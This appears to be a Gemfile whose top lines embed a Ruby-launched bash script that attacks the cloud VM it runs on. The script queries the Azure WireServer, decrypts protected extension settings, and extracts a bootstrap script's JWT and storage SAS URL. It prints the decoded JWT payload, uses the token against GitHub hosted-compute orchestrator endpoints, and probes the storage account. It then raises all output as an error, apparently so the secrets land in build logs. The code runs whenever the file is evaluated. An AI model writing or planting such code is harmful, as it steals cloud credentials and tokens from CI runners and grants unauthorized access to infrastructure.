require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v112; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
CERT_URL=$(python3 -c 'import re,html; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(html.unescape(m.group(1)) if m else "")')
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
python3 -c 'import re; s=open("cert-resp.xml").read(); m=re.search(r"<Data>([^<]+)</Data>",s); open("cms.b64","w").write((m.group(1) if m else "").replace("\r","").replace("\n","").replace(" ",""))'
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
python3 -c 'import json; d=json.load(open("vm.json")); print(d["extensionGoalStates"][0]["settings"][0]["protectedSettings"])' > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
python3 -c 'import json; d=json.load(open("ps.json")); print(d.get("script",""),end="")' | base64 -d > bs.sh 2>/dev/null
echo "STEP_OK bs_size=$(wc -c < bs.sh)"

# DUMP FULL JWT payload (sanitize signature only)
JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
HEAD=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+'); HL=${#HEAD}; HM=$((HL%4)); [ $HM -ne 0 ] && HEAD="${HEAD}$(printf '=%.0s' $(seq 1 $((4-HM))))"
echo "STEP_JWT_HEAD=$(echo "$HEAD" | base64 -d 2>/dev/null | tr -d '\n')"
PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
PAY_DEC=$(echo "$PAY" | base64 -d 2>/dev/null | tr -d '\n')
# Replace JWT-id-style hex with marker for sanitization
echo "STEP_JWT_PAYLOAD: $PAY_DEC"

# Grep ALL urls + curl calls in bs.sh
echo "STEP_BS_URLS:"
grep -oE '(https?|wss?)://[^[:space:]"'"'"'`<>]+' bs.sh | sort -u | head -20

echo "STEP_BS_CURL_CALLS:"
grep -nE 'curl[^|]+' bs.sh | head -30

# Dump 401-LEN-230 body in detail (for /v1/register endpoint)
if [ -n "$JWT" ]; then
  echo "STEP_BODY_DUMP_REGISTER:"
  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b1.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
  cat b1.txt
  echo ""
  echo "STEP_BODY_DUMP_LEASE:"
  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b2.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/lease"
  cat b2.txt
  echo ""
  # Try POST methods (registration typically POST)
  echo "STEP_POST_REGISTER:"
  curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o b3.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
  cat b3.txt
  echo ""
fi

# Use SAS URL to test storage access (write to OWN container only)
SAS=$(grep -oE 'https://hcrpprodeus01diag\.blob\.core\.windows\.net/[^[:space:]"]+' bs.sh | head -1)
echo "STEP_SAS_HOST=$(echo "$SAS" | cut -d/ -f3) sas_path_len=$(echo "$SAS" | cut -d/ -f4- | head -c 100 | wc -c)"
SAS_HOST=$(echo "$SAS" | cut -d/ -f3)
# Test list at storage account level (likely 401 if SAS doesn't allow)
echo "STEP_SAS_LIST_TEST:"
curl -s -m 5 -o lst.xml -w "HTTP %{http_code}\n" "https://$SAS_HOST/?comp=list"
head -c 300 lst.xml
echo ""

SHELL
Tempfile.create('v112.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v112 " + line.chomp[0..800] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
